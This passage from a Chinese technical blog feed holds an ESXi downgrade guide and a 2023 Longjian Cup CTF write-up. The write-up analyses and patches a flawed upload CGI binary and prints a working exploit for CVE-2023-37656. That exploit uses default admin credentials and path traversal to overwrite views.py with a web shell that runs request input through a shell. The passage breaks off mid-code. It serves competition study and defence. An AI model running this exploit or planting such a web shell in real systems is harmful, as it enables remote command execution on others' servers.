<li><a href="https://kb.vmware.com/s/article/1033604?lang=zh_CN">恢复为早期版本的 ESXi (1033604)</a>: <ul>
<li><blockquote>
<p>由于引导设备的分区有所更改，因此在升级到 ESXi 7.0 的情况下，将无法恢复到早期版本。注意：要在升级到 7.0 版之后使用 ESXi 的早期版本，必须在升级之前创建引导设备的备份，或者重新安装所需的版本。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li><p>得，重装⑧</p>
</li>
<li><p>下载 ESXi 资源 👉 <a href="https://mirror.mahanserver.net/VMware/ESXI/6.5.0/">6.5 版本</a></p>
<ul>
<li>之前那个官网上的<a href="https://my.vmware.com/zh/group/vmware/patch#search">下载链接</a>应该也是可以的（不过这次重装用的不是官网的</li>
<li>还是求稳妥吧，毕竟之前系统版本是 6.5，还是回滚回 6.5 好了</li>
</ul>
</li>
<li><p>驱动下载 👉 上面的<a href="https://www.inspur.com/eportal/ui?struts.portlet.action=/portlet/download-front!toView.action&pageId=2367231&product_id=4193&index=0&part_id=#driver">下载链接</a></p>
<ul>
<li>下载后解压 <code>DRV-ESX65-ADAP</code>，把里面的 <code>aacraid-esxi6.0-certification-package-1.2.1.58012.tar</code> 也解压了</li>
<li><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231013214752978.png" alt="image-20231013214752978"></li>
</ul>
</li>
<li><p>封装驱动需要用到 <a href="https://github.com/VFrontDe-Org/ESXi-Customizer-PS">ESXi-Customizer-PS.ps1</a></p>
<ul>
<li>依赖安装: <a href="https://developer.vmware.com/powercli/installation-guide">PowerCLI</a>, 安装参考这个连接即可</li>
<li>这里直接使用 powershell Bypass 绕过脚本限制，不过这样需要先修改一下原来的脚本，直接指定输出目录（通过 powershell 调用的时候这个 Path 是 null）：<ul>
<li>第 26 行中 <code>[string]$outDir = $(Split-Path $MyInvocation.MyCommand.Path),</code> 修改为 <code>[string]$outDir = &quot;D:\&quot;,</code> 即指定保存到 D 盘根路径</li>
</ul>
</li>
</ul>
</li>
<li><p>执行封装命令:</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\ex7\Desktop&gt; powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> .\ESXi<span class="literal">-Customizer-PS</span>.ps1 <span class="literal">-izip</span> .\VMware<span class="literal">-ESXi-6</span>.<span class="number">5.0</span><span class="literal">-Update3-13932383-HPE-preGen9-650</span>.U3.<span class="number">9.6</span>.<span class="number">8.8</span><span class="literal">-Jun2019-depot</span>.zip .\DRV<span class="literal">-ESX65-ADAP</span>\ <span class="literal">-nsc</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Running with PowerShell version <span class="number">5.1</span> and VMware PowerCLI version <span class="number">12.2</span>.<span class="number">0</span> build <span class="number">17538434</span></span><br><span class="line"></span><br><span class="line">Adding base Offline bundle .\VMware<span class="literal">-ESXi-6</span>.<span class="number">5.0</span><span class="literal">-Update3-13932383-HPE-preGen9-650</span>.U3.<span class="number">9.6</span>.<span class="number">8.8</span><span class="literal">-Jun2019-depot</span>.zip ... [<span class="type">OK</span>]</span><br><span class="line"></span><br><span class="line">Getting Imageprofiles, please wait ... [<span class="type">OK</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">Using</span> Imageprofile HPE-ESXi-6.5.0-Update3-preGen9-650.U3.9.6.8.8 ...</span><br><span class="line">(Dated <span class="number">06</span>/<span class="number">13</span>/<span class="number">2019</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">33</span>, AcceptanceLevel: PartnerSupported,</span><br><span class="line">HPE Custom Image Profile <span class="keyword">for</span> ESXi <span class="number">6.5</span>.<span class="number">0</span> Depot)</span><br><span class="line"></span><br><span class="line">Loading Offline bundles and VIB files from .\DRV<span class="literal">-ESX65-ADAP</span>\ ...</span><br><span class="line">   Loading C:\Users\ex7\Desktop\DRV<span class="literal">-ESX65-ADAP</span>\aacraid<span class="literal">-esxi6</span>.<span class="number">0</span><span class="literal">-1</span>.<span class="number">2.1</span>.<span class="number">58012</span>.zip ... [<span class="type">OK</span>]</span><br><span class="line">      Add VIB scsi<span class="literal">-aacraid</span> <span class="number">6.0</span>.<span class="number">6.2</span>.<span class="number">1.58012</span><span class="literal">-1OEM</span>.<span class="number">600.0</span>.<span class="number">0.2494585</span> [<span class="type">OK</span>, <span class="type">replaced</span> <span class="number">1.1</span><span class="type">.5.1</span>-<span class="number">9</span><span class="type">vmw.650.0.0.4564106</span>]</span><br><span class="line">   Loading C:\Users\ex7\Desktop\DRV<span class="literal">-ESX65-ADAP</span>\vmware<span class="literal">-esxi-drivers-scsi-aacraid-600</span>.<span class="number">6.2</span>.<span class="number">1.58012</span>.<span class="literal">-1</span>.<span class="number">0.6</span>.<span class="number">2494585</span>.x86_64.vib ... [<span class="type">OK</span>]</span><br><span class="line">      Add VIB scsi<span class="literal">-aacraid</span> <span class="number">6.0</span>.<span class="number">6.2</span>.<span class="number">1.58012</span><span class="literal">-1OEM</span>.<span class="number">600.0</span>.<span class="number">0.2494585</span> [<span class="type">IGNORED</span>, <span class="type">already</span> <span class="type">added</span>]</span><br><span class="line"></span><br><span class="line">Exporting the Imageprofile to <span class="string">&#x27;D:\\HPE-ESXi-6.5.0-Update3-preGen9-650.U3.9.6.8.8-customized.iso&#x27;</span>. Please be patient ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">All done.</span><br></pre></td></tr></table></figure>

<ul>
<li>后续安装的时候注意选择第二个 <code>Install ESXi, preserve VMFS datastore</code><ul>
<li>因为是降级安装，所以没法选择 Upgrade，然后选择保留数据</li>
</ul>
</li>
<li>重装完成后进行虚拟机重新注册即可</li>
</ul>
<blockquote>
<p>参考内容: <a href="https://blog.csdn.net/weixin_39122545/article/details/118730434">浪潮服务器安装ESXI6.7 无raid驱动解决方案</a></p>
</blockquote>
<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><ul>
<li>一切又回到了原来的样子😅</li>
<li>教训++:<ul>
<li>驱动</li>
<li>备份</li>
<li>稳定</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>折腾记</category>
      </categories>
      <tags>
        <tag>Ops</tag>
        <tag>vsphere</tag>
      </tags>
  </entry>
  <entry>
    <title>又双又叕重启更新Blog</title>
    <url>/2023/07/05/hello-world-again/</url>
    <content><![CDATA[<h1 id="假装是第一篇博客😅"><a href="#假装是第一篇博客😅" class="headerlink" title="假装是第一篇博客😅"></a>假装是第一篇博客😅</h1><ul>
<li>时隔不知道多久之后再一次燃起了发博客的激情，继 WordPress、Github+Hexo、语雀、Gitee+Hexo、Notion 换来换去之后再次回归 Github+Hexo<ul>
<li>继续犯选择困难症，博客主题纠结半天还得是经典的 Next</li>
</ul>
</li>
<li>先前写的内容质量实在是一言难尽，还是先整理整理这💩⛰再重发</li>
<li>主要还是记录一下整活的经验</li>
<li>博客佛系更新（主要还是懒）</li>
</ul>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>2023陇剑杯复盘</title>
    <url>/2023/09/16/ljb23/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/IMG_3208.jpg" alt="FishFarming"></p>
<h1 id="2023陇剑杯半决赛"><a href="#2023陇剑杯半决赛" class="headerlink" title="2023陇剑杯半决赛"></a>2023陇剑杯半决赛</h1><h2 id="半决赛战况"><a href="#半决赛战况" class="headerlink" title="半决赛战况"></a>半决赛战况</h2><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916102631498.png" alt="半决赛得分"></p>
<ul>
<li>战况: 逐日组 10th. 总排名 24th.</li>
<li>第一天体验海星，靠通防上大分😅</li>
</ul>
<h2 id="半决赛-Writeup"><a href="#半决赛-Writeup" class="headerlink" title="半决赛 Writeup"></a>半决赛 Writeup</h2><h3 id="实景防御"><a href="#实景防御" class="headerlink" title="实景防御"></a>实景防御</h3><ul>
<li>MINIGAME、SafeNote、staticFix 直接 <a href="https://github.com/TTY-flag/evilPatcher">evilPatcher</a> 上通防就能 fix</li>
<li><code>webpwn_</code> 队内的 web👴🏻 整的</li>
</ul>
<h4 id="ImageHost"><a href="#ImageHost" class="headerlink" title="ImageHost"></a>ImageHost</h4><ul>
<li>这是一个 cgi 程序(<code>upload.cgi</code>)，所做工作是接收 POST 上来的文件数据，提取文件名，验证文件后缀是否合法，验证通过则随机生成文件名拼接后缀保存，并返回文件名</li>
</ul>
<details class="note info"><summary><p><code>main</code> 函数</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">undefined8 <span class="title function_">FUN_001015ff</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">char</span> *pcVar3;</span><br><span class="line">  <span class="type">size_t</span> sVar4;</span><br><span class="line">  <span class="type">char</span> *pcVar5;</span><br><span class="line">  <span class="type">char</span> *pcVar6;</span><br><span class="line">  <span class="type">char</span> *pcVar7;</span><br><span class="line">  <span class="type">void</span> *__ptr;</span><br><span class="line">  <span class="type">ssize_t</span> sVar8;</span><br><span class="line">  </span><br><span class="line">  pcVar3 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((pcVar3 == <span class="literal">NULL</span>) || (iVar1 = strcasecmp(pcVar3,<span class="string">&quot;POST&quot;</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Invalid request method&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar3 = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar3 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;No data received&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = atoi(pcVar3);</span><br><span class="line">  <span class="keyword">if</span> ((iVar1 &lt; <span class="number">1</span>) || (<span class="number">0x500000</span> &lt; iVar1)) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Invalid content length&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar3 = <span class="built_in">malloc</span>(iVar1);</span><br><span class="line">  <span class="keyword">if</span> (pcVar3 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Memory allocation failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sVar4 = fread(pcVar3,<span class="number">1</span>,iVar1,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> (sVar4 != iVar1) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to read content&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar5 = <span class="built_in">strstr</span>(pcVar3,<span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar5 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to find file data&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = iVar1 - ((pcVar5 + <span class="number">4</span>) - pcVar3);</span><br><span class="line">  pcVar6 = <span class="built_in">strstr</span>(pcVar3,<span class="string">&quot;filename=\&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar6 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to find filename&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar6 = pcVar6 + <span class="number">10</span>;</span><br><span class="line">  pcVar7 = <span class="built_in">strchr</span>(pcVar6,<span class="string">L&#x27;\&quot;&#x27;</span>); <span class="comment">// 提取文件名</span></span><br><span class="line">  <span class="keyword">if</span> (pcVar7 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to find end of filename&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar2 = pcVar7 - pcVar6;</span><br><span class="line">  pcVar7 = <span class="built_in">malloc</span>(iVar2 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar7 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Memory allocation failed&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strncpy</span>(pcVar7,pcVar6,iVar2);</span><br><span class="line">  pcVar7[iVar2] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  iVar2 = FUN_001013c9(pcVar7); <span class="comment">// FUN_001013c9 这个函数进行后缀名合法检查</span></span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Invalid file type&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar6 = <span class="built_in">strrchr</span>(pcVar7,<span class="string">L&#x27;.&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar6 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to find file extension&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __ptr = FUN_00101506(pcVar6);</span><br><span class="line">  <span class="keyword">if</span> (__ptr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to generate filename&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar6 = FUN_00101473(__ptr);</span><br><span class="line">  <span class="keyword">if</span> (pcVar6 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to generate file path&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="built_in">free</span>(__ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar2 = open(pcVar6,<span class="number">0x241</span>,<span class="number">0x1ed</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">-1</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to open file&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="built_in">free</span>(__ptr);</span><br><span class="line">    <span class="built_in">free</span>(pcVar6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sVar8 = write(iVar2,pcVar5 + <span class="number">4</span>,iVar1);</span><br><span class="line">  <span class="keyword">if</span> (sVar8 != iVar1) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to write file data&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="built_in">free</span>(__ptr);</span><br><span class="line">    <span class="built_in">free</span>(pcVar6);</span><br><span class="line">    close(iVar2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  close(iVar2);</span><br><span class="line">  <span class="built_in">free</span>(pcVar3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content-Type: text/plain\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,__ptr);</span><br><span class="line">  <span class="built_in">free</span>(pcVar7);</span><br><span class="line">  <span class="built_in">free</span>(__ptr);</span><br><span class="line">  <span class="built_in">free</span>(pcVar6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</details>

<p>漏洞在这 <code>FUN_001013c9</code> 函数里头:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">undefined8 <span class="title function_">FUN_001013c9</span><span class="params">(<span class="type">char</span> *param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *pcVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  pcVar1 = <span class="built_in">strchr</span>(param_1,<span class="string">L&#x27;.&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((pcVar1 == <span class="literal">NULL</span>) ||</span><br><span class="line">     (((((*pcVar1 != <span class="string">&#x27;.&#x27;</span> || (pcVar1[<span class="number">1</span>] != <span class="string">&#x27;j&#x27;</span>)) || (pcVar1[<span class="number">2</span>] != <span class="string">&#x27;p&#x27;</span>)) || (pcVar1[<span class="number">3</span>] != <span class="string">&#x27;g&#x27;</span>)) &amp;&amp;</span><br><span class="line">      (((*pcVar1 != <span class="string">&#x27;.&#x27;</span> || (pcVar1[<span class="number">1</span>] != <span class="string">&#x27;p&#x27;</span>)) || ((pcVar1[<span class="number">2</span>] != <span class="string">&#x27;n&#x27;</span> || (pcVar1[<span class="number">3</span>] != <span class="string">&#x27;g&#x27;</span>)))))))) &#123;</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这个函数想要找到后缀并验证后缀是否为 <code>.jpg</code> 或 <code>.png</code>，但使用的是 <code>strchr</code> 函数，是从左侧找到第一次匹配的 <code>.</code>，如果上传的文件名为 <code>xxxx.jpg.txt</code> 即可绕过该检查</li>
<li>绕过后可通过构造软连接读取任意已知路径文件</li>
<li>修复方式也很简单，前面主函数 <code>001018be</code> 处看到有用 <code>strrchr</code>，直接将 <code>FUN_001013c9</code> 函数中的 <code>CALL strchr</code> 修改为 <code>CALL strrchr</code> 即可（从右侧找第一次匹配的<code>.</code>）</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916101153357.png" alt="image-20230916101153357"></p>
<p>这里在 Ghidra patch 时可以看到 call 的地址是 <code>0x00101230</code>，找到这个地址:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">                     **************************************************************</span><br><span class="line">                     *                       THUNK FUNCTION                       *</span><br><span class="line">                     **************************************************************</span><br><span class="line">                     thunk <span class="type">char</span> * <span class="title function_">strchr</span><span class="params">(<span class="type">char</span> * __s, <span class="type">int</span> __c)</span></span><br><span class="line">                       Thunked-Function: &lt;EXTERNAL&gt;::<span class="built_in">strchr</span></span><br><span class="line">     <span class="type">char</span> *            RAX:8          &lt;RETURN&gt;</span><br><span class="line">     <span class="type">char</span> *            RDI:8          __s</span><br><span class="line">     <span class="type">int</span>               ESI:4          __c</span><br><span class="line">                     &lt;EXTERNAL&gt;::<span class="built_in">strchr</span>                              XREF[2]:     FUN_001013c9:001013<span class="title function_">e5</span><span class="params">(c)</span>, </span><br><span class="line">                                                                                  FUN_001015ff:001017<span class="title function_">d1</span><span class="params">(c)</span>  </span><br><span class="line">00101230 f3 0f 1e fa     ENDBR64</span><br><span class="line">00101234 f2 ff 25        JMP        qword ptr [-&gt;&lt;EXTERNAL&gt;::<span class="built_in">strchr</span>]                 <span class="type">char</span> * <span class="title function_">strchr</span><span class="params">(<span class="type">char</span> * __s, <span class="type">int</span> __c)</span></span><br><span class="line">         45 2d 00 00</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>往下一点找 <code>strrstr</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">                     **************************************************************</span><br><span class="line">                     *                       THUNK FUNCTION                       *</span><br><span class="line">                     **************************************************************</span><br><span class="line">                     thunk <span class="type">char</span> * <span class="title function_">strrchr</span><span class="params">(<span class="type">char</span> * __s, <span class="type">int</span> __c)</span></span><br><span class="line">                       Thunked-Function: &lt;EXTERNAL&gt;::<span class="built_in">strrchr</span></span><br><span class="line">     <span class="type">char</span> *            RAX:8          &lt;RETURN&gt;</span><br><span class="line">     <span class="type">char</span> *            RDI:8          __s</span><br><span class="line">     <span class="type">int</span>               ESI:4          __c</span><br><span class="line">                     &lt;EXTERNAL&gt;::<span class="built_in">strrchr</span>                             XREF[1]:     FUN_001015ff:001018<span class="title function_">be</span><span class="params">(c)</span>  </span><br><span class="line">00101250 f3 0f 1e fa     ENDBR64</span><br><span class="line">00101254 f2 ff 25        JMP        qword ptr [-&gt;&lt;EXTERNAL&gt;::<span class="built_in">strrchr</span>]                <span class="type">char</span> * <span class="title function_">strrchr</span><span class="params">(<span class="type">char</span> * __s, <span class="type">int</span> _</span></span><br><span class="line"><span class="params">         <span class="number">35</span> <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span></span></span><br></pre></td></tr></table></figure>

<p>把调用的地址从 <code>0x00101230</code> 改成 <code>0x00101250</code> 就行, 用 Ghidra 的 patch，选这个修改字节最少的(1字节): <code>e8 46 fe ff ff</code> 👉 <code>e8 66 fe ff ff</code></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916101857277.png" alt="image-20230916101857277"></p>
<p>Ghidra Patch 之后导出的程序有大问题，直接服务异常；最后还是得用 IDA Pro 来 Patch，把这一个字节改了就能 fix 成功</p>
<blockquote>
<p>Ghidra Patch 之后导出的程序单看文件大小：修改前 18KB，patch后13KB(不晓得扬了啥)；提交使用 Ghidra Patch 后的程序的检查结果是服务异常【挖个坑，以后再看看为啥】</p>
<p>TODO</p>
</blockquote>
<h4 id="guide"><a href="#guide" class="headerlink" title="guide"></a>guide</h4><ul>
<li>这个是<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37656">CVE-2023-37656</a> 👉 <a href="https://github.com/mizhexiaoxiao/WebsiteGuide/issues/12">https://github.com/mizhexiaoxiao/WebsiteGuide/issues/12</a></li>
<li>👴🏻🚪当时没整出来：<ul>
<li>👉 fix: 检查文件后缀是否是 png，不是就给它 ban 了 </li>
<li>👉 check结果: EXP 利用成功</li>
<li>👉 竟然不行，不管了看别的了</li>
</ul>
</li>
<li>check的应该是任意文件写的问题吧，当时没往这方面想（👴🏻太菜了</li>
<li>赛题的环境复现的有点问题，就直接拿最新的docker镜像复现漏洞利用了:</li>
</ul>
<p>漏洞在 <code>websiteapp/views.py</code> 的 <code>class IconViewSet(View)</code> 的 post 方法中:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, request</span>):</span><br><span class="line">    <span class="built_in">id</span> = request.POST.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    name = request.POST.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(name) == <span class="string">&quot;default.png&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&#x27;图片名称不能为default.png，请修改&#x27;</span>&#125;)</span><br><span class="line">    file = request.FILES.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    save_path = os.path.join(settings.MEDIA_ROOT, <span class="string">&#x27;icon&#x27;</span>, name)  <span class="comment"># 这里能任意文件写，并且没有对文件类型进行限制</span></span><br><span class="line">    ins = models.WebSite.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="built_in">id</span>).first()</span><br><span class="line">    <span class="keyword">if</span> ins:</span><br><span class="line">        ins.icon = name</span><br><span class="line">        ins.save()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> chunk <span class="keyword">in</span> file.chunks():</span><br><span class="line">                    f.write(chunk)</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;替换成功&quot;</span>, <span class="string">&quot;detail&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;替换失败&quot;</span>, <span class="string">&quot;detail&quot;</span>: e&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">404</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>漏洞利用脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">login_url = <span class="string">&quot;http://localhost:8002/api/login/&quot;</span></span><br><span class="line">vuln_url = <span class="string">&quot;http://localhost:8002/api/icon/&quot;</span></span><br><span class="line"></span><br><span class="line">login_form = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin@1234&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">multiform_data = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;1&quot;</span>),</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;../../views.py&quot;</span>), <span class="comment"># 覆盖掉原来的 views.py</span></span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (<span class="string">&quot;a.png&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./payload.py&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&#x27;image/png&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">res = s.post(login_url, data=login_form).json()</span><br><span class="line">auth_token = res[<span class="string">&quot;detail&quot;</span>][<span class="string">&quot;token&quot;</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: auth_token</span><br><span class="line">&#125;</span><br><span class="line">res = s.post(vuln_url, files=multiform_data, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>这里的 <code>payload.py</code> 基于原本的 <code>views.py</code> 修改:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在刚刚的icon上传接口处加一个命令执行接口, 覆盖掉原来的 views.py</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, request</span>):</span><br><span class="line">        <span class="built_in">id</span> = request.POST.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        name = request.POST.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        p = Popen(name, shell=<span class="literal">True</span>, stdout=PIPE, stderr=PIPE)</span><br><span class="line">        stdout, stderr = p.communicate()</span><br><span class="line">        <span class="keyword">if</span> p.returncode == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;execute success&quot;</span>, <span class="string">&quot;detail&quot;</span>: stdout.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(name) == <span 